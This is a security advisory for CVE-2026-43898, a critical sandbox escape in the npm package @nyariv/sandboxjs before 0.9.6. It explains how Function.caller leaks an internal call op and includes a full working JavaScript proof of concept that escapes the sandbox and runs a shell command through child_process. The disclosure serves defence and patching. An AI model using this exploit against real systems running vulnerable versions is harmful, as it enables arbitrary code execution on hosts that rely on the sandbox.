# [C] SandboxJS has a sandbox escape via Function.caller leakage of internal call op

## Summary
Severity: Critical
Advisory: GHSA-g8f2-4f4f-5jqw
CVE: CVE-2026-43898
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-g8f2-4f4f-5jqw
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.9.6

## Details
### Summary
Sandbox-defined functions expose `Function.caller`, allowing sandboxed code to recover the internal `LispType.Call` runtime callback. That callback can then be invoked with attacker-controlled fake context and obj values to extract blocked host statics, recover the real host Function constructor, and execute arbitrary host JavaScript.
### Details

The vulnerability is in the property access logic registered via `addOps` in [prop.ts](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/prop.ts#L10). Sandboxed code could access the `caller`, `callee`, and `arguments` properties on functions. In the CommonJS build, this allowed sandboxed code to read `Function.caller` and leak a privileged internal `LispType.Call` callback.

In [executorUtils.ts](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/executorUtils.ts#L239-L282) `createFunction()` constructs normal host JS functions, and because these are ordinary host functions, sandbox code can observe:
```js
function f(){ return f.caller }
```
That leaks the host-side callback that invoked the sandbox function. This leaked callback is the internal `LispType.Call` op, which is registered in [call.ts](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L16-L17). The escape was possible because the `LispType.Call` handler accepts a **params** object from the attacker and uses its fields without authenticating that they came from the executor. if you looked at those branches [call.ts:47](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L47-L55), [call.ts:70](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L70), [call.ts:149](https://github.com/nyariv/SandboxJS/blob/1e6785658c94f5f2fb8e4a02cfcf1e7821b8be7f/src/executor/ops/call.ts#L149-L153). This means the attacker controls `obj.context`, `obj.prop`, `obj.get`, `context.evals.get` and `a`. This can lead to direct invocation of an internal primitive with forged operands

### PoC
```js
const sandb = require('@nyariv/sandboxjs').default;
const sand = new sandb(); 

const payload = `
const callOp = (function fn() { return fn.caller; })();

function makeContext(capture = () => {}) {
  return { ctx: { options: 0 }, evals: { get: capture } };
}

function leakStatic(obj, prop) {
  let leaked;
  callOp({
    done() {},
    a() {},
    b: [],
    obj: { context: obj, prop, get() {} },
    context: makeContext((fn) => (leaked = fn, () => 1))
  });
  return leaked;
}

function callDirect(fn, args) {
  let value;
  callOp({
    done(_, result) { value = result; },
    a() {},
    b: args,
    obj: fn,
    context: makeContext()
  });
  return value;
}

callDirect(leakStatic(Object, 'defineProperty'), [
  leakStatic,
  'call',
  callDirect(leakStatic(Object, 'getOwnPropertyDescriptor'), [
    callDirect(leakStatic(Object, 'getPrototypeOf'), [() => 0]),
    'constructor'
  ])
]);

let hostFn;
callOp({
  done(_, result) { hostFn = result; },
  a: leakStatic,
  b: [],
  obj: {
    context: 'return process.getBuiltinModule("child_process").execSync("whoami").toString()',
    get() {}
  },
  context: makeContext()
});

return hostFn();
`;

console.log(sand.compile(payload)().run());
```
### Impact
_Sandbox escape leads to RCE_

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-g8f2-4f4f-5jqw
- https://nvd.nist.gov/vuln/detail/CVE-2026-43898
- https://github.com/nyariv/SandboxJS/commit/826865251232611ec94078bab5a18ec875dad4a5
- https://github.com/nyariv/SandboxJS
